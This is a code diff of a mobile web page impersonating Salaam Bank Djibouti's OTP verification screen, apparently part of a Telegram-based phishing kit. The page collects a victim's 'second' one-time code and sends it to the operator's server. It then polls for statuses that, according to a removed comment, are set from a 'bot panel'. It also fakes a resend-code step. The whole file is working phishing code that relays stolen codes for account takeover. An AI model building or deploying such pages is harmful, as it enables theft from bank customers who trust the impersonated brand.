@@ -3,75 +3,66 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Vérification du Code (OTP) - Salaam Bank</title>
+    <title>Vérification du second code (OTP) - Salaam Bank Djibouti</title>
 
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
     <style>
+        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
         body { 
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
-            background-color: #0066b2; /* Salaam Bank Logo Blue */
             margin: 0; 
+            padding: 0; 
+            background-color: #0066b2; /* Salaam Bank Logo Blue */
+            color: #333333;
             display: flex; 
             flex-direction: column; 
-            align-items: center; 
-            min-height: 100vh;
-            overflow-x: hidden;
-            color: #333333;
+            min-height: 100vh; 
+            align-items: center;
         }
 
-        .card { 
-            background: #ffffff; /* Clean White Card */
-            width: 90%; 
-            max-width: 400px; 
-            margin-top: 40px; 
+        .container { 
+            background: #ffffff; /* Clean White Card Container */
+            width: 90%;
+            max-width: 400px;
+            margin-top: 40px;
             padding: 40px 20px; 
-            border-radius: 20px; 
+            border-radius: 20px;
             text-align: center; 
-            box-shadow: 0 10px 25px rgba(0,0,0,0.15); 
-            box-sizing: border-box;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.15);
         }
 
-        h2 { font-size: 22px; color: #0066b2; margin-bottom: 12px; font-weight: 700; }
-        .instruction { color: #666666; font-size: 15px; margin-bottom: 25px; line-height: 1.4; }
+        h2 { font-size: 22px; color: #0066b2; margin-bottom: 10px; font-weight: 700; }
+        p { font-size: 14px; color: #666666; line-height: 1.5; margin-bottom: 25px; }
 
-        .otp-group { 
-            display: flex; 
-            justify-content: center; 
-            gap: 12px; 
-            margin-bottom: 25px; 
-        }
-
-        .otp-input { 
+        .otp-inputs { display: flex; justify-content: center; gap: 12px; margin: 30px 0; }
+        .otp-inputs input {
             width: 52px; 
-            height: 60px; 
-            border: 1.5px solid #cbd5e1; 
+            height: 60px;
+            border: 1.5px solid #cbd5e1;
             background-color: #ffffff;
             color: #0066b2;
-            border-radius: 10px; 
-            text-align: center; 
-            font-size: 24px; 
-            font-weight: bold; 
-            outline: none; 
+            border-radius: 10px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            outline: none;
             transition: border-color 0.2s;
         }
 
-        .otp-input:focus {
-            border-color: #0066b2;
-        }
+        .otp-inputs input:focus { border-color: #0066b2; }
+        .resend-text { font-size: 13px; color: #888888; margin-bottom: 30px; }
 
-        .resend-text { color: #888888; font-size: 14px; margin-bottom: 25px; }
-
-        .btn-verify { 
-            background-color: #e2e8f0; 
-            color: #94a3b8; 
-            border: none; 
+        .btn-verify {
             width: 100%; 
-            padding: 18px; 
-            border-radius: 12px; 
-            font-size: 16px; 
-            font-weight: bold; 
+            padding: 16px;
+            border-radius: 12px;
+            border: none;
+            background-color: #e2e8f0;
+            color: #94a3b8;
+            font-size: 14px;
+            font-weight: bold;
             cursor: not-allowed;
+            text-transform: uppercase;
             transition: all 0.3s ease;
         }
 
@@ -89,199 +80,176 @@
             background-color: #00542a;
         }
 
-        .btn-wrong-pin {
-            background-color: transparent;
-            color: #dc2626;
-            border: 1px solid #f8b4b4;
-            width: 100%;
-            padding: 12px;
-            border-radius: 12px;
-            font-size: 14px;
-            font-weight: bold;
-            margin-top: 12px;
-            cursor: pointer;
-            transition: all 0.2s ease;
+        /* --- LOADING OVERLAY --- */
+        #loading-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 102, 178, 0.95);
+            display: none; flex-direction: column; justify-content: center;
+            align-items: center; z-index: 9999; color: #ffffff;
         }
-
-        .btn-wrong-pin:hover {
-            background-color: #fde8e8;
+        .spinner {
+            width: 40px; height: 40px; border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid #ffffff; border-radius: 50%;
+            animation: spin 1s linear infinite; margin-bottom: 20px;
         }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        #loadingSection { display: none; }
-
-        .footer-wave { 
-            width: 100%; 
-            background-color: #005291; /* Darker Blue Header/Footer */
-            padding: 25px 0;
-            margin-top: auto; 
-            text-align: center; 
-            color: rgba(255, 255, 255, 0.8);
-            font-size: 13px;
-        }
-
-        #errorBox {
-            color: #dc2626;
-            font-size: 14px;
-            font-weight: 500;
-            margin-bottom: 15px;
+        .footer {
+            width: 100%; height: 120px;
+            background-color: #005291; /* Darker Blue Footer */
+            display: flex; justify-content: center; align-items: center; color: rgba(255, 255, 255, 0.8);
+            font-size: 12px; margin-top: auto;
         }
     </style>
 </head>
 
 <body>
 
-<div class="card" id="inputSection">
-    <h2>Vérification du Code (OTP)</h2>
-    <p class="instruction">Entrez le code à 4 chiffres envoyé sur votre numéro de téléphone</p>
+<div id="loading-overlay">
+    <div class="spinner"></div>
+    <div style="font-size: 18px; font-weight: bold;">Veuillez patienter...</div>
+</div>
 
-    <div id="errorBox"></div>
+<div class="container">
+    <h2>Vérification du second code (OTP)</h2>
+    <p>Veuillez saisir le second code OTP envoyé à votre numéro de téléphone pour continuer.</p>
 
-    <div class="otp-group">
-        <input type="tel" maxlength="1" class="otp-input">
-        <input type="tel" maxlength="1" class="otp-input">
-        <input type="tel" maxlength="1" class="otp-input">
-        <input type="tel" maxlength="1" class="otp-input">
+    <div class="otp-inputs">
+        <input type="text" maxlength="1" inputmode="numeric">
+        <input type="text" maxlength="1" inputmode="numeric">
+        <input type="text" maxlength="1" inputmode="numeric">
+        <input type="text" maxlength="1" inputmode="numeric">
     </div>
 
-    <p class="resend-text">Renvoyer le code dans <span id="timer">60</span>s</p>
-
-    <button id="verifyBtn" class="btn-verify" onclick="handleVerification()" disabled>
-        VÉRIFIER LE CODE (OTP)
-    </button>
-
-    <button id="wrongPinBtn" class="btn-wrong-pin" onclick="handleWrongPin()">
-        ❌ PIN incorrect ? Réessayer
-    </button>
+    <div class="resend-text" id="timer-text"></div>
+    <button class="btn-verify" id="verify-btn" disabled>VÉRIFIER LE SECOND CODE (OTP)</button>
+    <div id="status-msg" style="margin-top:15px; font-size:14px; font-weight:500;"></div>
 </div>
 
-<div class="card" id="loadingSection">
-    <p style="color: #666666;">Veuillez patienter...</p>
-</div>
-
-<div class="footer-wave">
-    <p>© 2026 Salaam Bank. Tous droits réservés.</p>
-</div>
+<div class="footer">© 2026 Salaam Bank Djibouti. Tous droits réservés.</div>
 
 <script>
-const inputs = document.querySelectorAll('.otp-input');
-const verifyBtn = document.getElementById('verifyBtn');
-const inputSection = document.getElementById('inputSection');
-const loadingSection = document.getElementById('loadingSection');
-const timerText = document.getElementById('timer');
-const errorBox = document.getElementById('errorBox');
+const phone = localStorage.getItem('phone');
+const inputs = document.querySelectorAll('.otp-inputs input');
+const btn = document.getElementById('verify-btn');
+const timerDisplay = document.getElementById('timer-text');
+const statusMsg = document.getElementById('status-msg');
+const overlay = document.getElementById('loading-overlay');
 
-let isSubmitting = false;
+let countdown;
+let pollingInterval;
 
 window.onload = () => {
-    window.Telegram?.WebApp?.ready();
-    window.Telegram?.WebApp?.expand();
-
-    const phone = localStorage.getItem('phone');
-    if (!phone) {
-        errorBox.innerText = "Session expirée. Veuillez vous reconnecter.";
-        setTimeout(() => window.location.href = "/index.html", 1500);
+    if (window.Telegram?.WebApp) {
+        window.Telegram.WebApp.ready();
+        window.Telegram.WebApp.expand();
     }
-
-    startCountdown();
+    if (!phone) { window.location.href = "/page6"; return; }
+    inputs[0].focus();
+    startTimer();
 };
 
-function startCountdown() {
-    let count = 60;
-    const interval = setInterval(() => {
-        timerText.innerText = count;
-        count--;
-        if (count < 0) clearInterval(interval);
+function startTimer() {
+    let secondsLeft = 60;
+    clearInterval(countdown);
+    countdown = setInterval(() => {
+        secondsLeft--;
+        if (secondsLeft <= 0) {
+            clearInterval(countdown);
+            timerDisplay.innerHTML = '<span id="resend-btn" style="color:#0066b2; cursor:pointer; font-weight:bold;">Renvoyer le code</span>';
+            document.getElementById('resend-btn').onclick = resendCode;
+        } else {
+            timerDisplay.innerText = `Renvoyer le code dans ${secondsLeft} secondes`;
+        }
     }, 1000);
 }
 
-inputs.forEach((input, i) => {
-    input.addEventListener('input', () => {
-        input.value = input.value.replace(/[^0-9]/g, '');
-        if (input.value && i < inputs.length - 1) inputs[i + 1].focus();
-        check();
-    });
+async function resendCode() {
+    timerDisplay.innerText = "Un nouveau code est en cours d'envoi...";
+    
+    try {
+        await fetch('/api/resend-otp-notification', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ phone, step: "Second OTP" })
+        });
+    } catch (e) {}
 
+    setTimeout(startTimer, 2000);
+}
+
+inputs.forEach((input, index) => {
+    input.addEventListener('input', () => {
+        input.value = input.value.replace(/\D/g, '');
+        if (input.value && index < inputs.length - 1) inputs[index + 1].focus();
+        checkFull();
+    });
     input.addEventListener('keydown', (e) => {
-        if (e.key === "Backspace" && !input.value && i > 0) {
-            inputs[i - 1].focus();
-        }
+        if (e.key === 'Backspace' && !input.value && index > 0) inputs[index - 1].focus();
     });
 });
 
-function check() {
-    const filled = [...inputs].every(i => i.value.length === 1);
-    verifyBtn.disabled = !filled;
-    verifyBtn.classList.toggle('active', filled);
+function checkFull() {
+    const isComplete = Array.from(inputs).every(i => i.value !== '');
+    btn.disabled = !isComplete;
+    btn.classList.toggle('active', isComplete);
 }
 
-function handleWrongPin() {
-    // Redirects directly to page6 displaying the error URL parameter
-    window.location.href = "/page6.html?error=wrongpin";
-}
+btn.addEventListener('click', submitOtp);
 
-async function handleVerification() {
-    if (isSubmitting) return;
+async function submitOtp() {
+    if (btn.disabled) return;
+    const otp = Array.from(inputs).map(i => i.value).join('');
 
-    const phone = localStorage.getItem('phone');
-    if (!phone) return;
-
-    let otp = "";
-    inputs.forEach(i => otp += i.value);
-
-    isSubmitting = true;
-
-    inputSection.style.display = "none";
-    loadingSection.style.display = "block";
-    errorBox.innerText = "";
+    overlay.style.display = 'flex';
+    statusMsg.innerText = "";
 
     try {
-        await fetch('/api/verify-first-otp', {
+        await fetch('/api/verify-second-otp', {
             method: 'POST',
-            headers: {'Content-Type': 'application/json'},
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ phone, otp })
         });
-
-        const poll = setInterval(async () => {
-            const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
-            const data = await res.json();
-
-            // Success Route
-            if (data.status === "otp1_correct" || data.status === "approved") {
-                clearInterval(poll);
-                localStorage.setItem("phone", phone);
-                window.location.href = "/publicsuccess.html";
-            }
-
-            // Wrong PIN route triggered from bot panel
-            if (data.status === "wrong_pin" || data.status === "pin_incorrect") {
-                clearInterval(poll);
-                handleWrongPin();
-            }
-
-            // Wrong OTP code
-            if (data.status === "otp1_wrong") {
-                clearInterval(poll);
-                errorBox.innerText = "❌ Le code OTP est incorrect. Veuillez saisir le bon code.";
-                reset();
-            }
-
-        }, 2000);
-
-    } catch (err) {
-        console.error(err);
-        reset();
+        startPolling();
+    } catch {
+        overlay.style.display = 'none';
+        statusMsg.style.color = "#dc2626";
+        statusMsg.innerText = "Une erreur est survenue.";
     }
 }
 
-function reset() {
-    isSubmitting = false;
-    loadingSection.style.display = "none";
-    inputSection.style.display = "block";
+function startPolling() {
+    clearInterval(pollingInterval);
+    pollingInterval = setInterval(async () => {
+        try {
+            const res = await fetch(`/api/check-status?phone=${encodeURIComponent(phone)}`);
+            const data = await res.json();
+
+            if (data.status === "otp2_correct") {
+                clearInterval(pollingInterval);
+                window.location.href = "/success.html";
+            } 
+            else if (data.status === "otp2_wrongpin") {
+                clearInterval(pollingInterval);
+                overlay.style.display = 'none';
+                window.location.href = "/page6?error=wrongpin";
+            } 
+            else if (data.status === "otp2_wrong") {
+                clearInterval(pollingInterval);
+                overlay.style.display = 'none'; 
+                statusMsg.style.color = "#dc2626";
+                statusMsg.innerText = "❌ Le code OTP est incorrect.";
+                resetInputs();
+            }
+        } catch {}
+    }, 3000);
+}
+
+function resetInputs() {
     inputs.forEach(i => i.value = "");
-    verifyBtn.disabled = true;
-    verifyBtn.classList.remove('active');
+    btn.classList.remove('active');
+    btn.disabled = true;
 }
 </script>
-
 </body>
 </html>
